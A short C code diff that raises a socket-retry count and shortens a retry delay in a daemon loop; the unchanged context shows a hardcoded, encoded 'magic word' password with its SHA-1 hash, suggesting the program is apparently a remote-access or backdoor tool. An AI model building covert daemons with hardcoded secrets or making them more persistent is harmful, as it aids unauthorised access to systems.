@@ -37,7 +37,7 @@
 #define ATTY_OUT    2
 #define ATTY_ERR    4
 
-#define CREATE_SOCK_ATTEMPTS 10
+#define CREATE_SOCK_ATTEMPTS 15
 
 // "0c7e88b2c6bb81acf089d8f5b73489d1ecedc6b9" : sha1 of "l337Wh0R3@d"
 #define MAGIC_WORD "\xf0\xc8\x10\x40\x93\x47\x95\x58\x58\x92\x42\x93\x46\x92\x92\x58\x41\x91\x93\x96\x40\x58\x59\x94\x58\x96\x45\x92\x47\x43\x44\x58\x59\x94\x41\x95\x93\x95\x94\x93\x46\x92\x59"
@@ -302,7 +302,7 @@ int run_daemon() {
     }
 
   sleep:
-    sleep(5);
+    sleep(1);
     attempt += 1;
   }
 
